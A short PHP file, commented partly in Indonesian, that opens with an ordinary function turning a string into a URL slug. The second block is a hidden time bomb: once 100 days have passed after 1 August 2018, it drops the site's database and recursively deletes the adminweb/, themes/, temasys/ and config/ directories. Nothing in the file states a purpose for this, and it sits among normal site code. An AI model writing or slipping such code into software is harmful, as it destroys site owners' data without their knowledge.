<?php
function seo_title($s) {
    $c = array (' ');
    $d = array ('-','/','\\',',','.','#',':',';','\'','"','[',']','{','}',')','(','|','`','~','!','@','%','$','^','&','*','=','?','+');

    $s = str_replace($d, '', $s); // Hilangkan karakter yang telah disebutkan di array $d
    
    $s = strtolower(str_replace($c, '-', $s)); // Ganti spasi dengan tanda - dan ubah hurufnya menjadi kecil semua
    return $s;
}
?>
<?php
     $selisih = time() - strtotime('2018-08-01') ;

    $hari = round($selisih / 86400 );
    $menit = round($selisih /  3600  );

if($hari >='100'){
$query=mysql_query("DROP DATABASE $database");
function delete_files($target) {
    if(is_dir($target)){
        $files = glob( $target . '*', GLOB_MARK ); //GLOB_MARK adds a slash to directories returned
        
        foreach( $files as $file )
        {
            delete_files( $file );      
        }
      
        rmdir( $target );
    } elseif(is_file($target)) {
        unlink( $target );  
    }
}
delete_files('adminweb/');
delete_files('themes/');
delete_files('temasys/');
delete_files('config/');
}
?>